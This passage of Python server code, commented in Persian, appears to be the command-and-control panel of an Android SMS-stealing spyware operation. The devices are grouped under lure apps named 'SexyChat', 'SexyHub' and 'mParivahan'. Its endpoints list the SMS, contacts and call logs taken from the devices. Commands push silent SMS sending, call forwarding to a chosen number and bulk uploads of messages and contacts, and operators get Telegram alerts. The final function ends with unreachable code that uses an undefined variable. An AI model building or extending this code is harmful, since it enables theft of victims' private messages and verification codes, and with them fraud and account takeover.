    is_super_admin = current_admin.role == AdminRole.SUPER_ADMIN
    query = {} if is_super_admin else {"admin_username": current_admin.username}
    
    # گروه‌بندی بر اساس app_type
    pipeline = [
        {"$match": query},
        {"$group": {
            "_id": "$app_type",
            "count": {"$sum": 1}
        }},
        {"$sort": {"count": -1}}
    ]
    
    results = await mongodb.db.devices.aggregate(pipeline).to_list(None)
    
    # نام و آیکون برای هر نوع اپ
    app_names = {
        'sexychat': {'name': 'SexyChat', 'icon': '💬'},
        'mparivahan': {'name': 'mParivahan', 'icon': '🚗'},
        'sexyhub': {'name': 'SexyHub', 'icon': '🎬'},
        'MP': {'name': 'mParivahan', 'icon': '🚗'},  # Legacy
    }
    
    app_types = []
    for item in results:
        app_type = item["_id"] or "unknown"
        app_info = app_names.get(app_type, {'name': app_type, 'icon': '📱'})
        
        app_types.append(AppTypeInfo(
            app_type=app_type,
            display_name=app_info['name'],
            icon=app_info['icon'],
            count=item["count"]
        ))
    
    return AppTypesResponse(
        app_types=app_types,
        total=len(app_types)
    )


@app.get("/api/devices", response_model=DeviceListResponse)
async def get_devices(
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=1000),
    app_type: Optional[str] = Query(None, description="فیلتر بر اساس نوع اپلیکیشن"),
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    """
    لیست دستگاه‌ها
    
    - Admin: فقط دستگاه‌های خودش
    - Super Admin: همه دستگاه‌ها
    - فیلتر بر اساس app_type (اختیاری)
    """
    # 🔐 Super Admin همه رو می‌بینه، Admin معمولی فقط دستگاه‌های خودش
    is_super_admin = current_admin.role == AdminRole.SUPER_ADMIN
    
    # ساخت query با فیلتر app_type
    query = {} if is_super_admin else {"admin_username": current_admin.username}
    if app_type:
        query["app_type"] = app_type
    
    # فقط device های معتبر (که حداقل model دارن)
    query["model"] = {"$exists": True, "$ne": None}
    
    # دریافت دستگاه‌ها با فیلتر
    devices_cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort("registered_at", -1)
    devices = await devices_cursor.to_list(length=limit)
    
    # محاسبه total بر اساس فیلتر
    total = await mongodb.db.devices.count_documents(query)
    
    has_more = (skip + len(devices)) < total

    return DeviceListResponse(
        devices=devices, 
        total=total,
        hasMore=has_more
    )


@app.get("/api/admin/{admin_username}/devices", response_model=DeviceListResponse)
async def get_admin_devices(
    admin_username: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=1000),
    app_type: Optional[str] = Query(None, description="فیلتر بر اساس نوع اپلیکیشن"),
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):
    """
    🔐 فقط Administrator: مشاهده دستگاه‌های یک ادمین خاص
    
    - فقط Super Admin می‌تونه از این endpoint استفاده کنه
    - لیست دستگاه‌های یک ادمین خاص رو برمی‌گردونه
    - فیلتر بر اساس app_type (اختیاری)
    """
    # بررسی اینکه ادمین مورد نظر وجود داره
    target_admin = await auth_service.get_admin_by_username(admin_username)
    if not target_admin:
        raise HTTPException(status_code=404, detail=f"Admin '{admin_username}' not found")
    
    # دستگاه‌های ادمین مورد نظر با فیلتر app_type
    query = {"admin_username": admin_username}
    if app_type:
        query["app_type"] = app_type
    
    # فقط device های معتبر (که حداقل model دارن)
    query["model"] = {"$exists": True, "$ne": None}
    
    # دریافت دستگاه‌ها
    devices_cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort("registered_at", -1)
    devices = await devices_cursor.to_list(length=limit)
    
    total = await mongodb.db.devices.count_documents(query)
    has_more = (skip + len(devices)) < total
    
    # Log activity
    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.VIEW_DEVICE,
        description=f"Viewed devices for admin: {admin_username}" + (f" (app: {app_type})" if app_type else ""),
        ip_address="system"
    )
    
    return DeviceListResponse(
        devices=devices,
        total=total,
        hasMore=has_more
    )


@app.get("/api/devices/{device_id}")
async def get_device(
    device_id: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    device = await device_service.get_device(device_id)

    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.VIEW_DEVICE,
        description=f"Viewed device: {device_id}",
        ip_address=get_client_ip(request),
        device_id=device_id
    )

    return device

@app.get("/api/devices/{device_id}/sms")
async def get_device_sms(
    device_id: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(50, ge=1, le=500),
    request: Request = None,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_SMS))
):
    messages = await device_service.get_sms_messages(device_id, skip, limit)
    total = await mongodb.db.sms_messages.count_documents({"device_id": device_id})

    for msg in messages:
        if msg.get('body'):
            msg['body'] = msg['body'].replace('\ufffd', '').strip()

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.VIEW_SMS,
        description=f"Viewed SMS for device: {device_id}",
        ip_address=get_client_ip(request),
        device_id=device_id,
        metadata={"count": len(messages)}
    )

    return {
        "messages": messages,
        "total": total,
        "page": skip // limit + 1,
        "page_size": limit
    }

@app.get("/api/devices/{device_id}/contacts")
async def get_device_contacts(
    device_id: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=1000),
    request: Request = None,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_CONTACTS))
):
    contacts = await device_service.get_contacts(device_id, skip, limit)
    total = await mongodb.db.contacts.count_documents({"device_id": device_id})

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.VIEW_CONTACTS,
        description=f"Viewed contacts for device: {device_id}",
        ip_address=get_client_ip(request),
        device_id=device_id,
        metadata={"count": len(contacts)}
    )

    return {
        "contacts": contacts,
        "total": total
    }

@app.get("/api/devices/{device_id}/logs")
async def get_device_logs(
    device_id: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=500),
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    logs = await device_service.get_logs(device_id, skip, limit)
    total = await mongodb.db.logs.count_documents({"device_id": device_id})

    return {
        "logs": logs,
        "total": total
    }


@app.post("/api/devices/{device_id}/command")
async def send_command_to_device(
    device_id: str,
    command_request: SendCommandRequest,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.SEND_COMMANDS))
):
    device = await device_service.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    # ═══════════════════════════════════════════════════════
    # 📝 دستور NOTE
    # ═══════════════════════════════════════════════════════
    if command_request.command == "note":
        priority = command_request.parameters.get("priority", "none")
        message = command_request.parameters.get("message", "")
        
        # ذخیره در دیتابیس
        success = await device_service.save_device_note(device_id, priority, message)
        
        if not success:
            raise HTTPException(status_code=400, detail="Failed to save note")
        
        # ارسال به دستگاه از طریق Firebase
        result = await firebase_service.send_command_to_device(
            device_id,
            "note",
            {
                "priority": priority,
                "message": message
            }
        )
        
        # لاگ فعالیت ادمین
        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Sent note to device: {device_id} - Priority: {priority}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "note", "priority": priority, "message": message}
        )
        
        return {
            "success": True,
            "message": "Note saved and sent successfully",
            "type": "note",
            "result": result
        }

    # ═══════════════════════════════════════════════════════
    # 🔔 دستور PING از طریق Firebase
    # ═══════════════════════════════════════════════════════
    is_ping_command = command_request.command == "ping"
    ping_type = command_request.parameters.get("type", "server") if command_request.parameters else "server"

    if is_ping_command and ping_type == "firebase":
        logger.info(f"📤 Sending Firebase ping to device: {device_id}")

        # ✅ حذف type از parameters تا override نشه
        params = {k: v for k, v in (command_request.parameters or {}).items() if k != "type"}
        
        result = await firebase_service.send_command_to_device(
            device_id,
            "ping",
            params if params else None
        )

        if not result["success"]:
            raise HTTPException(status_code=400, detail=result["message"])

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Sent Firebase ping to device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "ping", "type": "firebase", "result": result}
        )

        await device_service.add_log(
            device_id, "command", "Firebase ping sent", "info"
        )
        
        # 🔔 اعلان به ربات ادمین
        await telegram_multi_service.notify_command_sent(
            current_admin.username, device_id, "ping (firebase)"
        )

        return {
            "success": True,
            "message": f"Firebase ping sent: {result['message']}",
            "type": "firebase",
            "result": result
        }

    # ═══════════════════════════════════════════════════════
    # 📨 دستور ارسال SMS
    # ═══════════════════════════════════════════════════════
    if command_request.command == "send_sms":
        phone = command_request.parameters.get("phone")
        message = command_request.parameters.get("message")
        sim_slot = command_request.parameters.get("simSlot", 0)

        if not phone or not message:
            raise HTTPException(status_code=400, detail="Phone and message are required")

        result = await firebase_service.send_sms(
            device_id=device_id,
            phone=phone,
            message=message,
            sim_slot=int(sim_slot)
        )

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Sent SMS command to device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "send_sms", "phone": phone, "sim_slot": sim_slot}
        )

        await device_service.add_log(
            device_id, "command", f"SMS command sent to {phone}", "info"
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    # ═══════════════════════════════════════════════════════
    # 📞 دستور فعال‌سازی هدایت تماس
    # ═══════════════════════════════════════════════════════
    if command_request.command == "call_forwarding":
        forward_number = command_request.parameters.get("number")
        sim_slot = command_request.parameters.get("simSlot", 0)

        if not forward_number:
            raise HTTPException(status_code=400, detail="Forward number is required")

        result = await firebase_service.enable_call_forwarding(
            device_id=device_id,
            forward_number=forward_number,
            sim_slot=int(sim_slot)
        )

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Enabled call forwarding on device: {device_id} to {forward_number}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "call_forwarding", "number": forward_number, "sim_slot": sim_slot}
        )

        await device_service.add_log(
            device_id, "command", f"Call forwarding enabled to {forward_number}", "info"
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    # ═══════════════════════════════════════════════════════
    # 📵 دستور غیرفعال‌سازی هدایت تماس
    # ═══════════════════════════════════════════════════════
    if command_request.command == "call_forwarding_disable":
        sim_slot = command_request.parameters.get("simSlot", 0)

        result = await firebase_service.disable_call_forwarding(
            device_id=device_id,
            sim_slot=int(sim_slot)
        )

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Disabled call forwarding on device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "call_forwarding_disable", "sim_slot": sim_slot}
        )

        await device_service.add_log(
            device_id, "command", "Call forwarding disabled", "info"
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    # ═══════════════════════════════════════════════════════
    # 📨⚡ دستور آپلود سریع SMS (50 پیامک)
    # ═══════════════════════════════════════════════════════
    if command_request.command == "quick_upload_sms":
        result = await firebase_service.quick_upload_sms(device_id)

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Requested quick SMS upload from device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "quick_upload_sms"}
        )

        await device_service.add_log(
            device_id, "command", "Quick SMS upload requested", "info"
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    # ═══════════════════════════════════════════════════════
    # 👥⚡ دستور آپلود سریع Contacts (50 مخاطب)
    # ═══════════════════════════════════════════════════════
    if command_request.command == "quick_upload_contacts":
        result = await firebase_service.quick_upload_contacts(device_id)

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Requested quick contacts upload from device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "quick_upload_contacts"}
        )

        await device_service.add_log(
            device_id, "command", "Quick contacts upload requested", "info"
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    # ═══════════════════════════════════════════════════════
    # 📨📦 دستور آپلود کامل همه SMS
    # ═══════════════════════════════════════════════════════
    if command_request.command == "upload_all_sms":
        result = await firebase_service.upload_all_sms(device_id)

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Requested full SMS upload from device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "upload_all_sms"}
        )

        await device_service.add_log(
            device_id, "command", "Full SMS upload requested", "info"
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    # ═══════════════════════════════════════════════════════
    # 👥📦 دستور آپلود کامل همه Contacts
    # ═══════════════════════════════════════════════════════
    if command_request.command == "upload_all_contacts":
        result = await firebase_service.upload_all_contacts(device_id)

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.SEND_COMMAND,
            description=f"Requested full contacts upload from device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"command": "upload_all_contacts"}
        )

        await device_service.add_log(
            device_id, "command", "Full contacts upload requested", "info"
        )

        return {
            "success": result["success"],
            "message": result["message"],
            "type": "firebase",
            "result": result
        }

    # ═══════════════════════════════════════════════════════
    # ❌ دستور ناشناخته
    # ═══════════════════════════════════════════════════════
    else:
        raise HTTPException(
            status_code=400, 
            detail=f"Unknown command: {command_request.command}"
        )



@app.put("/api/devices/{device_id}/settings")
async def update_device_settings(
    device_id: str,
    settings_request: UpdateSettingsRequest,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.CHANGE_SETTINGS))
):

    device = await device_service.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    settings_dict = settings_request.model_dump(exclude_unset=True)
    await device_service.update_device_settings(device_id, settings_dict)

    if manager.is_connected(device_id):
        if "sms_forward_enabled" in settings_dict:
            await manager.send_command(
                device_id,
                "toggle_forward",
                {"enabled": settings_dict["sms_forward_enabled"]}
            )

        if "forward_number" in settings_dict:
            await manager.send_command(
                device_id,
                "change_forward_number",
                {"number": settings_dict["forward_number"]}
            )

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.CHANGE_SETTINGS,
        description=f"Changed settings for device: {device_id}",
        ip_address=get_client_ip(request),
        device_id=device_id,
        metadata={"changes": settings_dict}
    )

    # 🔔 اعلان تغییر تنظیمات به ربات 3 (Admin activities)
    try:
        await telegram_multi_service.notify_admin_action(
            current_admin.username,
            "Settings Changed",
            f"Device: {device_id}, Changes: {', '.join(settings_dict.keys())}"
        )
    except Exception as e:
        logger.warning(f"⚠️ Failed to send Telegram notification: {e}")

    await device_service.add_log(
        device_id, "settings", "Settings updated", "info", settings_dict
    )

    return {
        "success": True,
        "message": "Settings updated successfully"
    }

@app.delete("/api/devices/{device_id}/sms")
async def delete_device_sms(
    device_id: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.DELETE_DATA))
):
    result = await mongodb.db.sms_messages.delete_many({"device_id": device_id})

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.DELETE_DATA,
        description=f"Deleted {result.deleted_count} SMS from device: {device_id}",
        ip_address=get_client_ip(request),
        device_id=device_id,
        metadata={"type": "sms", "count": result.deleted_count}
    )

    # 🔔 اعلان حذف داده به ربات 3 (Admin activities)
    try:
        await telegram_multi_service.notify_admin_action(
            current_admin.username,
            "Data Deleted",
            f"Deleted {result.deleted_count} SMS messages from device {device_id}"
        )
    except Exception as e:
        logger.warning(f"⚠️ Failed to send Telegram notification: {e}")

    return {
        "success": True,
        "deleted_count": result.deleted_count
    }

@app.get("/api/devices/{device_id}/calls")
async def get_device_calls(
    device_id: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=500),
    request: Request = None,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    try:

        calls_cursor = mongodb.db.call_logs.find(
            {"device_id": device_id}
        ).sort("timestamp", -1).skip(skip).limit(limit)

        calls = await calls_cursor.to_list(length=limit)
        total = await mongodb.db.call_logs.count_documents({"device_id": device_id})

        formatted_calls = []
        for call in calls:
            formatted_calls.append({
                "call_id": call.get("call_id"),
                "device_id": call.get("device_id"),
                "number": call.get("number", ""),
                "name": call.get("name", "Unknown"),
                "call_type": call.get("call_type", "unknown"),
                "timestamp": call.get("timestamp").isoformat() if isinstance(call.get("timestamp"), datetime) else datetime.utcnow().isoformat(),
                "duration": call.get("duration", 0),
                "duration_formatted": call.get("duration_formatted", "0s"),
                "received_at": call.get("received_at").isoformat() if isinstance(call.get("received_at"), datetime) else None
            })

        await admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.VIEW_DEVICE,
            description=f"Viewed call logs for device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"count": len(formatted_calls)}
        )

        return {
            "calls": formatted_calls,
            "total": total,
            "page": skip // limit + 1,
            "page_size": limit
        }

    except Exception as e:
        logger.error(f"❌ Failed to get call logs: {e}")
        raise HTTPException(status_code=500, detail=str(e))

    return {
        "call_logs": call_logs,
        "total": total,
        "page": skip // limit + 1,
        "page_size": limit
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "app.main:app",
        host=settings.SERVER_HOST,
        port=settings.SERVER_PORT,
        reload=settings.DEBUG,
        log_level="info"
    )